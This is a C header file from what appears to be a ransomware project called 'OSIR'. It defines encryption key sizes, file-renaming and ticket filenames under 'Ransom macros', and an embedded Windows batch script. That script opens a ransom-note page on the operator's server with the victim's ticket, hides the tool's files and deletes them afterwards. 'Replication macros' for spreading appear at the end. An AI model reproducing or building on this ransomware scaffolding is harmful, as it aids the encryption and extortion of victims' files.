/*
	This contains cross-file definitions
*/
#ifndef HEADER_COMMON
#    define HEADER_COMMON
#    include "settings.h"

	//Ease cross-platform writing
#    ifdef _WIN32
#        define stat64 _stat64
#        define popen _popen
#        define popen _popen
#        define pclose _pclose
#    endif

	//Max size of 32-bit integer
#    ifndef INT32_MAX
#        define INT32_MAX 2147483647
#    endif

	//Cryptographical macros
#    define SYMMETRIC_KEY_SIZE 128/8	//bytes
#    define SYMMETRIC_IV_SIZE 128/8	//bytes
#    define ASYMMETRIC_KEY_ID 1

	//Ransom macros
#    define MAX_BYTES_TO_ENCRYPT 16*1024
#    define TICKET_FILENAME ".osir_ticket"
#    define RELEASE_FILENAME ".osir_release"
#    define HASH_FILENAME ".osir_hash"
#    define RANSOM_EXTENSION ".ransom"
#    ifdef _WIN32
#        define RELEASE_SCRIPT_FILENAME "release.bat"
#        define RELEASE_SCRIPT "@echo off\n\nREM Prepare\nCLS\ntitle OSIR Hostage Release\n\nREM check if there is no ticket\nif NOT EXIST "TICKET_FILENAME" (echo No ticket exists... & exit)\n\nREM get ticket for GET request\nfor /f \"tokens=*\" %%a in ('type .osir_ticket') do set x=%%a\n\nREM go to ransomnote page\nstart "SERVER_OSIR_HOME"/note.php?ticket=%x%\n\nREM hide .osir_ files\nattrib +h "RELEASE_FILENAME"\nattrib +h "TICKET_FILENAME"\nattrib +h "HASH_FILENAME"\n\nREM run OSIR in release mode\n"RELEASE_FILENAME"\n\nREM Delete OSIR files\nif NOT EXIST "TICKET_FILENAME" (del /F "HASH_FILENAME" & del /F "RELEASE_FILENAME")"
#    else
#        define RELEASE_INTRO_SCRIPT "clear"
#    endif


	//Replication macros
#    define XOR_KEY_SIZE 8	// Do not change w/o changing weakcrypt.php
#    define END_MARKER "xj9"
#    define END_MARKER_SIZE 3
#endif
